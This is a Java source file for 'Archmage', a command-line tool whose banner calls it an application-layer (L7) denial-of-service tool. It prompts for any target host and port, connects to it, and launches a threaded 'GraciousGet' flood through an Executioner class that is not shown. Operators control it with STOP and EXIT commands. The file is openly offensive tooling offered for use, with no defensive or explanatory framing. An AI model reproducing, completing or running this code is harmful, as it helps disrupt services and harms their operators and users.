package m3rlin;

import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

public class Archmage {

	private static final String STOP_ATTACK = "STOP";
	private static final String EXIT_ARCHMAGE = "EXIT";

	Executioner executioner;	
	private Socket socket;
	private Scanner console;
	private String host;
	private int port;
	
	public void start() {
		try {				
			console = new Scanner(System.in);
			System.out.println("\n>> Attempting connection to " + host + ":" + port + "...");
			socket = new Socket(host, port);
			System.out.println(">> Established connection to " + host + ":" + port + "...");
			System.out.println(">> Begninning GraciousGet attack...\n");
			executioner = new Executioner(host, port);
			executioner.start();
			while (executioner.isRunning()) {
				if(console.hasNextLine()) {
					String input = console.nextLine();
					if (input != null && input.length() > 0) {
						if (input.equalsIgnoreCase(STOP_ATTACK)) {
							stop();
						} else if (input.equalsIgnoreCase(EXIT_ARCHMAGE)) {
							exit();
						}
					} else {
						System.out.print("Attack threads: " + executioner.getActiveCount());
					}
				}
			}
			getHostInfo();
			start();
		} catch (UnknownHostException e) {			
			System.out.println(">> Could not locate the host; try another, or check again later (UnknownHostException)");			
		} catch (ConnectException e) {		
			System.out.println(">> Could not connect to the socket address; try another port, or start checking for firewall issues (ConnectException)");			
		} catch (IllegalArgumentException e) {			
			System.out.println(">> Port out of range; try another (IllegalArgumentException)");
		} catch (IOException e) {
			System.out.println(">> Badness while acquiring socket connection (IOException)");
			e.printStackTrace();
		}
	}
	
	public void stop() throws IOException {
		System.out.println(">> Stopping attack...");
		executioner.stop();
		socket.close();
	}
	
	public void exit() throws IOException {
		System.out.println("\n>> Stopping attack, exiting...");
		executioner.stop();
		console.close();
		socket.close();
		System.exit(0);
	}
	
	public void getHostInfo() {
		console = new Scanner(System.in);
		System.out.print("\nEnter target (IP or host): ");
		host = console.nextLine();
		try {
			System.out.print("Enter port (Default: 80): ");
			String portStr = console.nextLine();
			if (portStr == null || portStr.length() == 0) {
				port = 80;
			} else {
				port = Integer.parseInt(portStr);
			}
		} catch (NumberFormatException e) {		
			System.out.println("\n>> Port numbers can't contain non-numeric characters");
			getHostInfo();
		}		
	}
	
	public static void main(String[] args) {
		System.out.println("+-------------------+");
		System.out.println("| Archmage (L7 DoS) |");
		System.out.println("+-------------------+");
		Archmage archmage;
		while (true) {
			archmage = new Archmage();
			archmage.getHostInfo();
			archmage.start();	
		}
	}
}
